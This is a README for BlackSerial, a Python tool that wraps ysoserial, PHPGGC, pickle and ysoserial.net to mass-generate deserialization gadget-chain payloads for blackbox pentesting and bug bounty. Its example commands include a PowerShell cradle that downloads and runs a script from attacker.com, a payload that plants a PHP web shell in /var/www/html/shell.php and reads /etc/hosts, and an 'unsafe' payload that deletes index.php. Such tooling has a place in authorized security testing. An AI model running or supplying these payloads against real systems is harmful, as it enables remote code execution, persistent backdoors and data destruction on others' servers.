# BlackSerial

A Blackbox Gadget Chain Serializer for Java ([YSOSerial](https://github.com/frohoff/ysoserial)), PHP ([PHPGGC](https://github.com/ambionics/phpggc)), Python ([Pickle](https://docs.python.org/3/library/pickle.html)), C#/.Net ([YSOSerial\.Net](https://github.com/pwntester/ysoserial)).

BlackSerial is a python wrapper for different gadget chain serializers. It is designed to be used during Blackbox pentesting or Bugbounty where you suspect a deserialisation user input but you don't have the code to identify or craft a gadget chain.

Its first objective is to identify working gadget chain on a blackbox code base via out of band interact/collaborator dns callback, not to do the full exploitation. You can detect the good gadget chain by putting `%%chain_id%%` in your payload for instance. Then use directly the serializer.

It attempts to generate all possible chains, managing the burden of providing different input formats and options, and output the results in a file that can be used in Burp Intruder for instance.

It provides no new technique.

## Features

* Generates around 200 gadget chains in a "best effort" approach with default options and all possible formatters
* Supported serializers: PHPGGC (PHP), YSOSerial (Java), YSOSerial.Net (C# .Net), Pickle (Python)
* Out of band execution detection first
* Standardized cli interface for all serializers
* Supported encodings: Base64 `-b`, URL `-u`, or Base64 URL safe `-ub`
* Isolates unsafe gadgets that delete files with `--unsafe` option
* Can generates all payloads in 1 file or 1 file per payload with `-o1` in the format `<chain_name>.txt`
* Can generates 1 named gadget chain
* Add custom serializers options with `--phpggc-options`, `--ysoserial-options` and `--ysoserial-net-options`
* Provides 5 custom pickle byte-code (it's not really a chain for pickle)

Note: a similar project exists but for ysoserial only and do not work for all payloads: https://github.com/aludermin/ysoserial-wrapper

## Basic examples

List all supported gadget chains:
```
python3 blackserial.py -s all -l
```

Generates PHP payloads base64 encoded into `payloads.txt` (default output file) with `nslookup %%domain%%` system command (default command):
```
python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b
```

Same with Java but URL encoded:
```
python3 blackserial.py -s java -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -u
```

Same with Python but Base64 urlsafe:
```
python3 blackserial.py -s python -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -bu
```

Same with C#:
```
python3 blackserial.py -s csharp -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -bu
```

## Advanced examples

Generates Java payloads base64 encoded with powershell cradle for Windows target:
```
python3 blackserial.py -s java -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b -c "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1');\"" -o payloads.txt
```

Generates PHP payloads base64 encoded and then URL encoded and custom read/write files locations:
```
python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b -u -o payloads.txt --remote-content '<?php echo exec($_GET["command"]); ?>' --remote-file-to-write /var/www/html/shell.php --remote-file-to-read /etc/hosts 
```

Generates also unsafe PHP payloads base64 encoded and try to delete `/var/www/html/index.php`:
```
python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b -o payloads.txt --unsafe --remote-file-to-delete /var/www/html/index.php
```

Generates C# payloads with formatter types `Json.Net` and `FastJson` with 1 payload by file:
```
python3 blackserial.py -s csharp -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com --ysoserial-net-formatter Json.Net,FastJson -o1 --output ./payloads-dir/
```

Generates only 1 PHP gadget `WordPress/Dompdf/RCE1` with PHP function `exec`:
```
python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b --php-function exec WordPress/Dompdf/RCE1
```

## Docker install

TODO

## Script local install

```
./install.sh
```

## Manual install

Offline installation is possible with required dependencies in the `./archives` directory.

### phpggc

```
git clone https://github.com/ambionics/phpggc
```

### ysoserial

Install JRE8 in a local directory:
```
wget "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=251398_0d8f12bc927a4e2c9f8568ca567db4ee" -O jre-8u431-linux-x64.tar.gz
tar -xzf jre-8u431-linux-x64.tar.gz
```

Download last release from officiel repo: https://github.com/frohoff/ysoserial/releases
```
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

Put `ysoserial-all.jar` in the same directory as `blackserial.py`

## pickle

Just install python pickle module:
```
pip3 install pickledb
```

### ysoserial\.net

Under debian linux, use wine:
```
sudo apt update 
sudo apt install mono-complete wine winetricks -y
winetricks dotnet48
winetricks nocrashdialog
```

Download last release from officiel repo: https://github.com/pwntester/ysoserial.net/releases

Unzip it.

Make a unit test to see if everything is ok:
```
wine ./Release/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"
```

## FAQ / known issues

## Why install another JRE? I have already one installed

Lots of ysoserial payloads need at least JRE 11 and some JRE 8. It is better to download a local JVM to generate them correctly. You can still use your JVM with the option `--java-path`

## Why ysoserial\.net generation is so slow?

Under linux, blackserial uses wine to launch ysoserial.exe and thus it is slow. Should not be the case under Windows.

## Some gadgets fail to generate

* ysoserial\.net: ActivitySurrogateDisableTypeCheck
* ysoserial\.net: PSObject 
* ysoserial\.net: ObjRef with formatter 'ObjectStateFormatter'
* ysoserial\.net: TypeConfuseDelegateMono
* ysoserial\.net: XamlAssemblyLoadFromFile with formatter 'SoapFormatter'
* phpggc: Symfony/RCE14 (PR opened)



## TODO

* ruby
* manage phar
* docker


## ⚠️ WARNING: LEGAL DISCLAIMER

This tool is intended for **educational and ethical use only**. The author is not liable for any illegal use or misuse of this tool. Users are solely responsible for their actions and must ensure they have explicit permission to scan the target systems.